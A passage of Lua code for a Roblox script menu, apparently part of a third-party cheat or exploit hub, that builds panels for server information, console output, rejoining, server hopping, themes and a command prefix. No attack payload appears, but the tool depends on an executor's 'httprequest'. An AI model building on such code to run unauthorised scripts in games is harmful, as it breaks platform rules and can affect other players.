			local success, result = pcall(function()
				return math.floor(statsService:GetNetworkPing() * 1000)
			end)
			if success then ping = result end
		end

		if ping == "n/a" and statsService and statsService.Network then
			local success, result = pcall(function()
				return math.floor(statsService.Network.ServerStatsItem["Data Ping"]:GetValue())
			end)
			if success then ping = result end
		end
	end)

	return ping
end

function getServerRegion()
	local success, result = pcall(function()
		local region = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game:GetService("Players").LocalPlayer)
		return region:gsub("^%l", string.upper)
	end)
	return success and result or "n/a"
end

function getServerFPS()
	local success, result = pcall(function()
		return math.floor(1/game:GetService("RunService").RenderStepped:Wait())
	end)
	return success and result or "n/a"
end

function getServerUptime()
	local success, result = pcall(function()
		return os.time() - game:GetService("Workspace").DistributedGameTime
	end)
	if success then
		local hours = math.floor(result/3600)
		local minutes = math.floor((result%3600)/60)
		return string.format("%dh %dm", hours, minutes)
	end
	return "n/a"
end

function getServerMaxPlayers()
	return game:GetService("Players").MaxPlayers or "n/a"
end

unable["server information tab"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["information holder"].Visible = false
	unable["server information holder"].Visible = true
	unable["output holder"].Visible = false
	unable["output scrolling frame"].Visible = false
	unable["console label"].Visible = false
	unable["clear console button"].Visible = false

	spawn(function()
		local playerCount = getPlayerCount()
		local placeId = getPlaceId()
		local jobId = getJobId()
		local gameName = getGameName()
		local creatorInfo = getCreatorInfo()
		local creatorInServer = getCreatorInServer()
		local ping = getPing()
		local serverRegion = getServerRegion()
		local serverFPS = getServerFPS()
		local serverUptime = getServerUptime()
		local maxPlayers = getServerMaxPlayers()

		local informationText = string.format(
			"game name: %s\n" ..
				"creator: %s\n" ..
				"creators in server: %s\n" ..
				"players in server: %s/%s\n" ..
				"place ID: %s\n" ..
				"job ID: %s\n" ..
				"server region: %s\n" ..
				"ping: %s ms\n" ..
				"server FPS: %s\n" ..
				"uptime: %s\n",
			gameName, 
			creatorInfo,
			creatorInServer or "none",
			playerCount, maxPlayers,
			placeId,
			jobId,
			serverRegion,
			ping,
			serverFPS,
			serverUptime
		)

		unable["server information holder"].Text = informationText
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["output holder"].Size = UDim2.new(0, 393, 0, 214)
unable["output holder"].Position = UDim2.new(0, 4, 0, 31)
unable["output holder"].BackgroundColor3 = unable["default background color"]
unable["output holder"].BorderColor3 = unable["default border color"]
unable["output holder"].BorderSizePixel = 0
unable["output holder"].Parent = unable["main frame 2"]
unable["output holder"].Visible = false
unable["output holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

unable["output scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
unable["output scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
unable["output scrolling frame"].BackgroundColor3 = unable["default background color"]
unable["output scrolling frame"].BorderColor3 = unable["default border color"]
unable["output scrolling frame"].BorderSizePixel = 1
unable["output scrolling frame"].ScrollBarThickness = 8
unable["output scrolling frame"].ScrollBarImageColor3 = unable["default 1/2 color"]
unable["output scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
unable["output scrolling frame"].Parent = unable["main frame 2"]
unable["output scrolling frame"].ZIndex = 24
unable["output scrolling frame"].Visible = false
unable["output scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

unable["output textbox"].Name = "temphalf"
unable["output textbox"].Size = UDim2.new(0, 393, 0, 164)
unable["output textbox"].Position = UDim2.new(0, 0, 0, 0)
unable["output textbox"].BackgroundColor3 = unable["default background color"]
unable["output textbox"].BorderColor3 = unable["default border color"]
unable["output textbox"].BorderSizePixel = 0
unable["output textbox"].TextColor3 = unable["default border color"]
unable["output textbox"].PlaceholderText = "output from the roblox console will appear here"
unable["output textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["output textbox"].Font = Enum.Font.RobotoMono
unable["output textbox"].TextSize = 15
unable["output textbox"].TextScaled = false
unable["output textbox"].Text = ""
unable["output textbox"].TextXAlignment = Enum.TextXAlignment.Left
unable["output textbox"].TextYAlignment = Enum.TextYAlignment.Top
unable["output textbox"].ClearTextOnFocus = false
unable["output textbox"].MultiLine = true
unable["output textbox"].Parent = unable["output scrolling frame"]
unable["output textbox"].ZIndex = 24
unable["output textbox"].TextEditable = false

unable["output textbox text padding"] = Instance.new("UIPadding")
unable["output textbox text padding"].PaddingLeft = UDim.new(0, 4)
unable["output textbox text padding"].PaddingTop = UDim.new(0, 4)
unable["output textbox text padding"].PaddingBottom = UDim.new(0, 4)
unable["output textbox text padding"].Parent = unable["output scrolling frame"]

local function addTextWithNewline2(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas3()
end

function updateCanvas3()
	local textBounds = unable["output textbox"].TextBounds

	unable["output textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	unable["output scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	unable["output scrolling frame"].CanvasPosition = Vector2.new(0, unable["output scrolling frame"].CanvasSize.Y.Offset)
end

unable["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas3)

updateCanvas3()

local LogService = game:GetService("LogService")

LogService.MessageOut:Connect(function(message, messageType)
	addTextWithNewline2(unable["output textbox"], message)
	updateCanvas3()
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["clear console button"].Size = UDim2.new(0, 393, 0, 45)
unable["clear console button"].Position = UDim2.new(0, 4, 0, 200)

unable["clear console button"].BackgroundColor3 = unable["default background color"]

unable["clear console button"].BorderColor3 = unable["default border color"]
unable["clear console button"].BorderSizePixel = 1

unable["clear console button"].TextColor3 = unable["default border color"]
unable["clear console button"].Font = Enum.Font.RobotoMono
unable["clear console button"].TextSize = 15
unable["clear console button"].TextScaled = false
unable["clear console button"].Text = "clear"
unable["clear console button"].TextXAlignment = Enum.TextXAlignment.Center
unable["clear console button"].TextYAlignment = Enum.TextYAlignment.Center

unable["clear console button text padding"] = Instance.new("UIPadding")
unable["clear console button text padding"].PaddingLeft = UDim.new(0, 0)
unable["clear console button text padding"].Parent = unable["clear console button"]

unable["clear console button"].Parent = unable["main frame 2"]
unable["clear console button"].ZIndex = 24
unable["clear console button"].Visible = false

unable["clear console button"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["output textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["console label"].Size = UDim2.new(0, 393, 0, 19)
unable["console label"].Position = UDim2.new(0, 0, 0, 0)
unable["console label"].TextColor3 = unable["default border color"]
unable["console label"].Font = Enum.Font.RobotoMono
unable["console label"].TextScaled = false
unable["console label"].TextSize = 15
unable["console label"].Text = "console (/console) output"
unable["console label"].TextXAlignment = Enum.TextXAlignment.Center
unable["console label"].TextYAlignment = Enum.TextYAlignment.Center
unable["console label"].BackgroundColor3 = unable["default background color"]
unable["console label"].BorderColor3 = unable["default border color"]
unable["console label"].BorderSizePixel = 1
unable["console label"].Parent = unable["output holder"]
unable["console label"].ZIndex = 24

unable["console label text padding"] = Instance.new("UIPadding")
unable["console label text padding"].PaddingBottom = UDim.new(0, 1)
unable["console label text padding"].Parent = unable["console label"]

-------------------------------------------------------------------------------------------------------------------------------

unable["console output tab"].Size = UDim2.new(0, 133, 0, 26)
unable["console output tab"].Position = UDim2.new(0, 268, 0, 0)

unable["console output tab"].BackgroundColor3 = unable["default background color"]
unable["console output tab"].BorderColor3 = unable["default border color"]
unable["console output tab"].BorderSizePixel = 1

unable["console output tab"].TextColor3 = unable["default border color"]
unable["console output tab"].Font = Enum.Font.RobotoMono
unable["console output tab"].TextSize = 15
unable["console output tab"].TextScaled = false
unable["console output tab"].Text = "console output"
unable["console output tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["console output tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["console output tab text padding"] = Instance.new("UIPadding")
unable["console output tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["console output tab text padding"].Parent = unable["scripts tab"]

unable["console output tab"].Parent = unable["main frame 2"]
unable["console output tab"].ZIndex = 21

unable["console output tab"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["information holder"].Visible = false
	unable["server information holder"].Visible = false
	unable["output holder"].Visible = true
	unable["output scrolling frame"].Visible = true
	unable["console label"].Visible = true
	unable["clear console button"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["information holder"].Size = UDim2.new(0, 393, 0, 214)
unable["information holder"].Position = UDim2.new(0, 4, 0, 31)
unable["information holder"].BackgroundColor3 = unable["default background color"]
unable["information holder"].BorderColor3 = unable["default border color"]
unable["information holder"].BorderSizePixel = 1
unable["information holder"].Parent = unable["main frame 2"]
unable["information holder"].ZIndex = 19
unable["information holder"].Visible = true

unable["information holder"].TextColor3 = unable["default border color"]
unable["information holder"].Font = Enum.Font.RobotoMono
unable["information holder"].TextSize = 15
unable["information holder"].TextScaled = false
unable["information holder"].Text = "loading..."
unable["information holder"].TextXAlignment = Enum.TextXAlignment.Left
unable["information holder"].TextYAlignment = Enum.TextYAlignment.Top
unable["information holder"].ZIndex = 21
unable["information holder"].TextWrapped = true

unable["information holder text padding"] = Instance.new("UIPadding")
unable["information holder text padding"].PaddingLeft = UDim.new(0, 4)
unable["information holder text padding"].PaddingTop = UDim.new(0, 4)
unable["information holder text padding"].PaddingBottom = UDim.new(0, 4)
unable["information holder text padding"].Parent = unable["information holder"]

-------------------------------------------------------------------------------------------------------------------------------

unable["server information holder"].Size = UDim2.new(0, 393, 0, 214)
unable["server information holder"].Position = UDim2.new(0, 4, 0, 31)
unable["server information holder"].BackgroundColor3 = unable["default background color"]
unable["server information holder"].BorderColor3 = unable["default border color"]
unable["server information holder"].BorderSizePixel = 1
unable["server information holder"].Parent = unable["main frame 2"]
unable["server information holder"].ZIndex = 19
unable["server information holder"].Visible = false

unable["server information holder"].TextColor3 = unable["default border color"]
unable["server information holder"].Font = Enum.Font.RobotoMono
unable["server information holder"].TextSize = 15
unable["server information holder"].TextScaled = false
unable["server information holder"].Text = "loading..."
unable["server information holder"].TextXAlignment = Enum.TextXAlignment.Left
unable["server information holder"].TextYAlignment = Enum.TextYAlignment.Top
unable["server information holder"].ZIndex = 21
unable["server information holder"].TextWrapped = true

unable["server information holder text padding"] = Instance.new("UIPadding")
unable["server information holder text padding"].PaddingLeft = UDim.new(0, 4)
unable["server information holder text padding"].PaddingTop = UDim.new(0, 4)
unable["server information holder text padding"].PaddingBottom = UDim.new(0, 4)
unable["server information holder text padding"].Parent = unable["server information holder"]

-------------------------------------------------------------------------------------------------------------------------------

unable["script settings tab"].Size = UDim2.new(0, 199, 0, 26)
unable["script settings tab"].Position = UDim2.new(0, 0, 0, 0)

unable["script settings tab"].BackgroundColor3 = unable["default background color"]

unable["script settings tab"].BorderColor3 = unable["default border color"]
unable["script settings tab"].BorderSizePixel = 1

unable["script settings tab"].TextColor3 = unable["default border color"]
unable["script settings tab"].Font = Enum.Font.RobotoMono
unable["script settings tab"].TextSize = 15
unable["script settings tab"].TextScaled = false
unable["script settings tab"].Text = "script settings"
unable["script settings tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["script settings tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["script settings tab text padding"] = Instance.new("UIPadding")
unable["script settings tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["script settings tab text padding"].Parent = unable["scripts tab"]

unable["script settings tab"].Parent = unable["main frame 3"]
unable["script settings tab"].ZIndex = 23

unable["script settings tab"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["last updated"].Parent = unable["script settings holder"]
	unable["server settings holder"].Visible = false
	unable["script settings holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["server settings tab"].Size = UDim2.new(0, 201, 0, 26)
unable["server settings tab"].Position = UDim2.new(0, 200, 0, 0)

unable["server settings tab"].BackgroundColor3 = unable["default background color"]

unable["server settings tab"].BorderColor3 = unable["default border color"]
unable["server settings tab"].BorderSizePixel = 1

unable["server settings tab"].TextColor3 = unable["default border color"]
unable["server settings tab"].Font = Enum.Font.RobotoMono
unable["server settings tab"].TextSize = 15
unable["server settings tab"].TextScaled = false
unable["server settings tab"].Text = "server settings"
unable["server settings tab"].TextXAlignment = Enum.TextXAlignment.Center
unable["server settings tab"].TextYAlignment = Enum.TextYAlignment.Center

unable["server settings tab text padding"] = Instance.new("UIPadding")
unable["server settings tab text padding"].PaddingLeft = UDim.new(0, 0)
unable["server settings tab text padding"].Parent = unable["scripts tab"]

unable["server settings tab"].Parent = unable["main frame 3"]
unable["server settings tab"].ZIndex = 23

unable["server settings tab"].MouseButton1Click:Connect(function()
	playclicksound()
	unable["last updated"].Parent = unable["server settings holder"]
	unable["server settings holder"].Visible = true
	unable["script settings holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["server settings holder"].Size = UDim2.new(0, 393, 0, 214)
unable["server settings holder"].Position = UDim2.new(0, 4, 0, 31)
unable["server settings holder"].BackgroundColor3 = unable["default background color"]
unable["server settings holder"].BorderColor3 = unable["default border color"]
unable["server settings holder"].BackgroundTransparency = 1
unable["server settings holder"].Parent = unable["main frame 3"]
unable["server settings holder"].Visible = false
unable["server settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

unable["change fps cap"].Size = UDim2.new(0, 230, 0, 60)
unable["change fps cap"].Position = UDim2.new(0, 0, 0, 24)
unable["change fps cap"].TextColor3 = unable["default border color"]
unable["change fps cap"].Font = Enum.Font.RobotoMono
unable["change fps cap"].TextScaled = false
unable["change fps cap"].TextSize = 15
unable["change fps cap"].Text = "fps cap: " .. getServerFPS()
unable["change fps cap"].TextXAlignment = Enum.TextXAlignment.Center
unable["change fps cap"].TextYAlignment = Enum.TextYAlignment.Center
unable["change fps cap"].BackgroundColor3 = unable["default background color"]
unable["change fps cap"].BorderColor3 = unable["default border color"]
unable["change fps cap"].BorderSizePixel = 1
unable["change fps cap"].Parent = unable["server settings holder"]
unable["change fps cap"].ZIndex = 24

unable["change fps cap setting"].Size = UDim2.new(0, 158, 0, 27)
unable["change fps cap setting"].Position = UDim2.new(0, 235, 0, 24)
unable["change fps cap setting"].TextColor3 = unable["default border color"]
unable["change fps cap setting"].Font = Enum.Font.RobotoMono
unable["change fps cap setting"].TextScaled = false
unable["change fps cap setting"].TextSize = 15
unable["change fps cap setting"].Text = "change fps cap"
unable["change fps cap setting"].TextXAlignment = Enum.TextXAlignment.Center
unable["change fps cap setting"].TextYAlignment = Enum.TextYAlignment.Center
unable["change fps cap setting"].BackgroundColor3 = unable["default background color"]
unable["change fps cap setting"].BorderColor3 = unable["default border color"]
unable["change fps cap setting"].BorderSizePixel = 1
unable["change fps cap setting"].Parent = unable["server settings holder"]
unable["change fps cap setting"].ZIndex = 24

unable["change fps cap textbox"].Size = UDim2.new(0, 158, 0, 28)
unable["change fps cap textbox"].Position = UDim2.new(0, 235, 0, 56)
unable["change fps cap textbox"].TextColor3 = unable["default border color"]
unable["change fps cap textbox"].Font = Enum.Font.RobotoMono
unable["change fps cap textbox"].TextScaled = false
unable["change fps cap textbox"].TextSize = 15
unable["change fps cap textbox"].Text = ""
unable["change fps cap textbox"].PlaceholderText = "enter value here"
unable["change fps cap textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["change fps cap textbox"].TextXAlignment = Enum.TextXAlignment.Center
unable["change fps cap textbox"].TextYAlignment = Enum.TextYAlignment.Center
unable["change fps cap textbox"].BackgroundColor3 = unable["default background color"]
unable["change fps cap textbox"].BorderColor3 = unable["default border color"]
unable["change fps cap textbox"].BorderSizePixel = 1
unable["change fps cap textbox"].Parent = unable["server settings holder"]
unable["change fps cap textbox"].ZIndex = 24

unable["change fps cap setting"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	local fpscap = tonumber(unable["change fps cap textbox"].Text)
	if fpscap and fpscap ~= "" then
		fpscap = math.clamp(fpscap, 1, 240)
		unable["change fps cap"].Text = "fps cap: " .. fpscap
	end
	unable["change fps cap textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["rejoin server"].Size = UDim2.new(0, 128, 0, 60)
unable["rejoin server"].Position = UDim2.new(0, 0, 0, 89)
unable["rejoin server"].TextColor3 = unable["default border color"]
unable["rejoin server"].Font = Enum.Font.RobotoMono
unable["rejoin server"].TextScaled = false
unable["rejoin server"].TextSize = 15
unable["rejoin server"].Text = "rejoin server"
unable["rejoin server"].TextXAlignment = Enum.TextXAlignment.Center
unable["rejoin server"].TextYAlignment = Enum.TextYAlignment.Center
unable["rejoin server"].BackgroundColor3 = unable["default background color"]
unable["rejoin server"].BorderColor3 = unable["default border color"]
unable["rejoin server"].BorderSizePixel = 1
unable["rejoin server"].Parent = unable["server settings holder"]
unable["rejoin server"].ZIndex = 24

unable["rejoin server"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if #unable["players"]:GetPlayers() <= 1 then
		unable["players"].LocalPlayer:Kick("rejoining -.-")
		wait()
		unable["teleport service"]:Teleport(getPlaceId(), unable["players"].LocalPlayer)
	else
		unable["teleport service"]:TeleportToPlaceInstance(getPlaceId(), getJobId(), unable["players"].LocalPlayer)
	end
end)

unable["leave game"].Size = UDim2.new(0, 127, 0, 60)
unable["leave game"].Position = UDim2.new(0, 133, 0, 89)
unable["leave game"].TextColor3 = unable["default border color"]
unable["leave game"].Font = Enum.Font.RobotoMono
unable["leave game"].TextScaled = false
unable["leave game"].TextSize = 15
unable["leave game"].Text = "leave game"
unable["leave game"].TextXAlignment = Enum.TextXAlignment.Center
unable["leave game"].TextYAlignment = Enum.TextYAlignment.Center
unable["leave game"].BackgroundColor3 = unable["default background color"]
unable["leave game"].BorderColor3 = unable["default border color"]
unable["leave game"].BorderSizePixel = 1
unable["leave game"].Parent = unable["server settings holder"]
unable["leave game"].ZIndex = 24

unable["leave game"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	game:Shutdown()
end)

unable["server hop"].Size = UDim2.new(0, 128, 0, 60)
unable["server hop"].Position = UDim2.new(0, 265, 0, 89)
unable["server hop"].TextColor3 = unable["default border color"]
unable["server hop"].Font = Enum.Font.RobotoMono
unable["server hop"].TextScaled = false
unable["server hop"].TextSize = 15
unable["server hop"].Text = "server hop"
unable["server hop"].TextXAlignment = Enum.TextXAlignment.Center
unable["server hop"].TextYAlignment = Enum.TextYAlignment.Center
unable["server hop"].BackgroundColor3 = unable["default background color"]
unable["server hop"].BorderColor3 = unable["default border color"]
unable["server hop"].BorderSizePixel = 1
unable["server hop"].Parent = unable["server settings holder"]
unable["server hop"].ZIndex = 24

unable["server hop"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	if httprequest then
		local servers = {}
		local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", getPlaceId())})
		local body = HttpService:JSONDecode(req.Body)

		if body and body.data then
			for i, v in next, body.data do
				if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
					table.insert(servers, 1, v.id)
				end
			end
		end

		if #servers > 0 then
			unable["teleport service"]:TeleportToPlaceInstance(getPlaceId(), servers[math.random(1, #servers)], unable["players"].LocalPlayer)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

unable["auto rejoin toggle"].Size = UDim2.new(0, 230, 0, 60)
unable["auto rejoin toggle"].Position = UDim2.new(0, 0, 0, 154)
unable["auto rejoin toggle"].TextColor3 = unable["default border color"]
unable["auto rejoin toggle"].Font = Enum.Font.RobotoMono
unable["auto rejoin toggle"].TextScaled = false
unable["auto rejoin toggle"].TextSize = 15
unable["auto rejoin toggle"].Text = "auto rejoin: disabled"
unable["auto rejoin toggle"].TextXAlignment = Enum.TextXAlignment.Center
unable["auto rejoin toggle"].TextYAlignment = Enum.TextYAlignment.Center
unable["auto rejoin toggle"].BackgroundColor3 = unable["default background color"]
unable["auto rejoin toggle"].BorderColor3 = unable["default border color"]
unable["auto rejoin toggle"].BorderSizePixel = 1
unable["auto rejoin toggle"].Parent = unable["server settings holder"]
unable["auto rejoin toggle"].ZIndex = 24

unable["toggle auto rejoin on"].Size = UDim2.new(0, 158, 0, 27)
unable["toggle auto rejoin on"].Position = UDim2.new(0, 235, 0, 154)
unable["toggle auto rejoin on"].TextColor3 = unable["default border color"]
unable["toggle auto rejoin on"].Font = Enum.Font.RobotoMono
unable["toggle auto rejoin on"].TextScaled = false
unable["toggle auto rejoin on"].TextSize = 15
unable["toggle auto rejoin on"].Text = "enable"
unable["toggle auto rejoin on"].TextXAlignment = Enum.TextXAlignment.Center
unable["toggle auto rejoin on"].TextYAlignment = Enum.TextYAlignment.Center
unable["toggle auto rejoin on"].BackgroundColor3 = unable["default background color"]
unable["toggle auto rejoin on"].BorderColor3 = unable["default border color"]
unable["toggle auto rejoin on"].BorderSizePixel = 1
unable["toggle auto rejoin on"].Parent = unable["server settings holder"]
unable["toggle auto rejoin on"].ZIndex = 24

unable["toggle auto rejoin off"].Size = UDim2.new(0, 158, 0, 28)
unable["toggle auto rejoin off"].Position = UDim2.new(0, 235, 0, 186)
unable["toggle auto rejoin off"].TextColor3 = unable["default border color"]
unable["toggle auto rejoin off"].Font = Enum.Font.RobotoMono
unable["toggle auto rejoin off"].TextScaled = false
unable["toggle auto rejoin off"].TextSize = 15
unable["toggle auto rejoin off"].Text = "disable"
unable["toggle auto rejoin off"].TextXAlignment = Enum.TextXAlignment.Center
unable["toggle auto rejoin off"].TextYAlignment = Enum.TextYAlignment.Center
unable["toggle auto rejoin off"].BackgroundColor3 = unable["default background color"]
unable["toggle auto rejoin off"].BorderColor3 = unable["default border color"]
unable["toggle auto rejoin off"].BorderSizePixel = 1
unable["toggle auto rejoin off"].Parent = unable["server settings holder"]
unable["toggle auto rejoin off"].ZIndex = 24

arj = false

unable["toggle auto rejoin on"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	unable["auto rejoin toggle"].Text = "auto rejoin: enabled"
	arj = true
end)

unable["toggle auto rejoin off"].MouseButton1Click:Connect(function()
	spawn(playclicksound)
	unable["auto rejoin toggle"].Text = "auto rejoin: disabled"
	arj = false
end)

if game.PlaceId ~= unable["test game"] then
	unable["gui service"].ErrorMessageChanged:Connect(function()
		if arj == false then return end
		unable["gui service"].ErrorMessageChanged:Connect(function()
			rejoin()
		end)
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

unable["script settings holder"].Size = UDim2.new(0, 393, 0, 214)
unable["script settings holder"].Position = UDim2.new(0, 4, 0, 31)
unable["script settings holder"].BackgroundColor3 = unable["default background color"]
unable["script settings holder"].BorderColor3 = unable["default border color"]
unable["script settings holder"].BorderSizePixel = 0
unable["script settings holder"].Parent = unable["main frame 3"]
unable["script settings holder"].Visible = true
unable["script settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

unable["last updated"].Size = UDim2.new(0, 393, 0, 19)
unable["last updated"].Position = UDim2.new(0, 0, 0, 0)
unable["last updated"].TextColor3 = unable["default border color"]
unable["last updated"].Font = Enum.Font.RobotoMono
unable["last updated"].TextScaled = false
unable["last updated"].TextSize = 15
unable["last updated"].Text = "script developed and revived by unable aka meowsynther | gg/xZC8zJzF7u | some require scripts were skidded from team fat gui and polaria because im a lazy fuck | gg/xZC8zJzF7u | team noxious on top | gg/xZC8zJzF7u | s to the k to the i to the d | gg/xZC8zJzF7u | jljjx fj x cxddlq | gg/xZC8zJzF7u | i fucking hate people who think they are actual FE bypassers | gg/xZC8zJzF7u | "
unable["last updated"].TextXAlignment = Enum.TextXAlignment.Center
unable["last updated"].TextYAlignment = Enum.TextYAlignment.Center
unable["last updated"].BackgroundColor3 = unable["default background color"]
unable["last updated"].BorderColor3 = unable["default border color"]
unable["last updated"].BorderSizePixel = 1
unable["last updated"].Parent = unable["script settings holder"]
unable["last updated"].ZIndex = 24
unable["last updated"].ClipsDescendants = true

unable["last updated text padding"] = Instance.new("UIPadding")
unable["last updated text padding"].PaddingBottom = UDim.new(0, 2)
unable["last updated text padding"].Parent = unable["last updated"]

local scrollSpeed = 0.1
local originalText = unable["last updated"].Text

coroutine.wrap(function()
	while true do
		wait(scrollSpeed)
		originalText = originalText:sub(2) .. originalText:sub(1,1)
		unable["last updated"].Text = originalText
	end
end)()

-------------------------------------------------------------------------------------------------------------------------------

unable["current theme"].Size = UDim2.new(0, 230, 0, 60)
unable["current theme"].Position = UDim2.new(0, 0, 0, 24)
unable["current theme"].TextColor3 = unable["default border color"]
unable["current theme"].Font = Enum.Font.RobotoMono
unable["current theme"].TextScaled = false
unable["current theme"].TextSize = 15
unable["current theme"].Text = "current theme: default"
unable["current theme"].TextXAlignment = Enum.TextXAlignment.Center
unable["current theme"].TextYAlignment = Enum.TextYAlignment.Center
unable["current theme"].BackgroundColor3 = unable["default background color"]
unable["current theme"].BorderColor3 = unable["default border color"]
unable["current theme"].BorderSizePixel = 1
unable["current theme"].Parent = unable["script settings holder"]
unable["current theme"].ZIndex = 24

unable["change theme setting"].Size = UDim2.new(0, 158, 0, 60)
unable["change theme setting"].Position = UDim2.new(0, 235, 0, 24)
unable["change theme setting"].TextColor3 = unable["default border color"]
unable["change theme setting"].Font = Enum.Font.RobotoMono
unable["change theme setting"].TextScaled = false
unable["change theme setting"].TextSize = 15
unable["change theme setting"].Text = "change theme"
unable["change theme setting"].TextXAlignment = Enum.TextXAlignment.Center
unable["change theme setting"].TextYAlignment = Enum.TextYAlignment.Center
unable["change theme setting"].BackgroundColor3 = unable["default background color"]
unable["change theme setting"].BorderColor3 = unable["default border color"]
unable["change theme setting"].BorderSizePixel = 1
unable["change theme setting"].Parent = unable["script settings holder"]
unable["change theme setting"].ZIndex = 24

local currenttheme = "default"
local themes = {
	"default",
	"rainbow",
	"grayscale",
	"noxious",
	"c00l2",
	"c00l",
	"light"
}

function updthemedisplay()
	unable["current theme"].Text = "current theme: " .. currenttheme
end

function applytheme(themeName)

	rainbowtheme = false
	grayscaletheme = false
	noxioustheme = false
	c00ltheme = false
	c00l2theme = false
	lighttheme = false

	stoprb()

	if themeName == "rainbow" then
		rainbowtheme = true
		startrb()
	elseif themeName == "grayscale" then
		grayscaletheme = true
		grayscalecols()
	elseif themeName == "noxious" then
		noxioustheme = true
		noxiouscols()
	elseif themeName == "c00l2" then
		c00l2theme = true
		c00l2cols()
	elseif themeName == "c00l" then
		c00ltheme = true
		c00lcols()
	elseif themeName == "light" then
		lighttheme = true
		lightcols()
	elseif themeName == "default" then
		rainbowtheme = false
		grayscaletheme = false
		noxioustheme = false
		c00ltheme = false
		c00l2theme = false
		lighttheme = false
		stoprb()
		restorecols()
	end

	currenttheme = themeName
	updthemedisplay()
	updcols()
end

function cycleTheme()
	local currentind = 1
	for i, theme in ipairs(themes) do
		if theme == currenttheme then
			currentind = i
			break
		end
	end

	local nextind = currentind % #themes + 1
	applytheme(themes[nextind])
end

unable["change theme setting"].MouseButton1Click:Connect(function()
	if playclicksound then
		playclicksound()
	end
	cycleTheme()
end)

updthemedisplay()

-------------------------------------------------------------------------------------------------------------------------------

unable["command prefix"].Size = UDim2.new(0, 230, 0, 60)
unable["command prefix"].Position = UDim2.new(0, 0, 0, 89)
unable["command prefix"].TextColor3 = unable["default border color"]
unable["command prefix"].Font = Enum.Font.RobotoMono
unable["command prefix"].TextScaled = false
unable["command prefix"].TextSize = 15
unable["command prefix"].Text = "command prefix: ."
unable["command prefix"].TextXAlignment = Enum.TextXAlignment.Center
unable["command prefix"].TextYAlignment = Enum.TextYAlignment.Center
unable["command prefix"].BackgroundColor3 = unable["default background color"]
unable["command prefix"].BorderColor3 = unable["default border color"]
unable["command prefix"].BorderSizePixel = 1
unable["command prefix"].Parent = unable["script settings holder"]
unable["command prefix"].ZIndex = 24

unable["change command prefix setting"].Size = UDim2.new(0, 158, 0, 27)
unable["change command prefix setting"].Position = UDim2.new(0, 235, 0, 89)
unable["change command prefix setting"].TextColor3 = unable["default border color"]
unable["change command prefix setting"].Font = Enum.Font.RobotoMono
unable["change command prefix setting"].TextScaled = false
unable["change command prefix setting"].TextSize = 15
unable["change command prefix setting"].Text = "change prefix"
unable["change command prefix setting"].TextXAlignment = Enum.TextXAlignment.Center
unable["change command prefix setting"].TextYAlignment = Enum.TextYAlignment.Center
unable["change command prefix setting"].BackgroundColor3 = unable["default background color"]
unable["change command prefix setting"].BorderColor3 = unable["default border color"]
unable["change command prefix setting"].BorderSizePixel = 1
unable["change command prefix setting"].Parent = unable["script settings holder"]
unable["change command prefix setting"].ZIndex = 24

unable["change command prefix setting"].MouseButton1Click:Connect(function()
	playclicksound()
	local nooprefix = unable["change command prefix textbox"].Text
	changeprefix(nooprefix)
end)

unable["change command prefix textbox"].Size = UDim2.new(0, 158, 0, 28)
unable["change command prefix textbox"].Position = UDim2.new(0, 235, 0, 121)
unable["change command prefix textbox"].TextColor3 = unable["default border color"]
unable["change command prefix textbox"].Font = Enum.Font.RobotoMono
unable["change command prefix textbox"].TextScaled = false
unable["change command prefix textbox"].TextSize = 15
unable["change command prefix textbox"].Text = ""
unable["change command prefix textbox"].PlaceholderText = "enter prefix here"
unable["change command prefix textbox"].PlaceholderColor3 = unable["default 1/2 color"]
unable["change command prefix textbox"].TextXAlignment = Enum.TextXAlignment.Center
unable["change command prefix textbox"].TextYAlignment = Enum.TextYAlignment.Center
unable["change command prefix textbox"].BackgroundColor3 = unable["default background color"]
unable["change command prefix textbox"].BorderColor3 = unable["default border color"]
unable["change command prefix textbox"].BorderSizePixel = 1
unable["change command prefix textbox"].Parent = unable["script settings holder"]
